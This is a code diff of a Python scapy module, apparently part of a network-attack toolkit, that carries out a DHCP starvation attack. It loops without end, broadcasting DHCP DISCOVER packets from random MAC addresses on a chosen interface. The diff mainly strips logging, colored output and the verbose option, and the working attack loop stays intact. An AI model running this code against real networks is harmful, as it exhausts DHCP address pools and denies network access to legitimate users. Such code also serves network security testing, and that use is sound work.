@@ -1,21 +1,20 @@
 # -*- coding: utf-8 -*-
-import logging
-logging.getLogger("scapy.runtime").setLevel(logging.WARNING)
 
 from scapy.all import Ether, RandMAC, sendp
 from scapy.layers.inet import IP, UDP
 from scapy.layers.dhcp import BOOTP, DHCP
-from termcolor import colored
-import six
 
 
-def run(interface, verbose):
+# --------------------------------------------------------------------------
+#
+# --------------------------------------------------------------------------
+
+def run(interface):
 
     if len(interface) > 0:
         inter = str(interface[0])
 
         try:
-            six.print_(colored("[*]", "blue"), "Running DHCP DISCOVER ATTACK...")
             while 1:
                 src_mac = str(RandMAC())
                 ethernet = Ether(dst='ff:ff:ff:ff:ff:ff', src=src_mac, type=0x800)
@@ -24,11 +23,11 @@ def run(interface, verbose):
                 bootps = BOOTP(chaddr=src_mac, ciaddr='0.0.0.0', xid=0x01020304, flags=1)
                 dhcps = DHCP(options=[("message-type", "discover"), "end"])
                 packet = ethernet / ip / udp / bootps / dhcps
-                sendp(packet, iface=inter, verbose=verbose)
+                sendp(packet, iface=inter, verbose=0)
         except KeyboardInterrupt:
             pass
 
 
 def run_attack(config):
-    run(config.interface, config.verbose)
+    run(config.interface)
 
